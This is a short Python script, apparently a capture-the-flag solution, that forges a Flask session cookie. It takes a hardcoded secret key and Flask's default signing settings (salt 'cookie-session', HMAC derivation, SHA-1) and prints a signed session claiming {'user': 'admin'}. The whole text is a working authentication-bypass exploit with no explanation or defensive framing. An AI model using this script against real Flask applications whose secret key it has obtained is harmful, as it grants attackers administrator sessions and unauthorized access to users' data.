import hashlib
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
from flask.sessions import TaggedJSONSerializer

session = {"user": "admin"}
secret = '4a6282bf78c344a089a2dc5d2ca93ae6'

print(URLSafeTimedSerializer(
    secret_key=secret,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer=TimestampSigner,
    signer_kwargs={
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
).dumps(session))
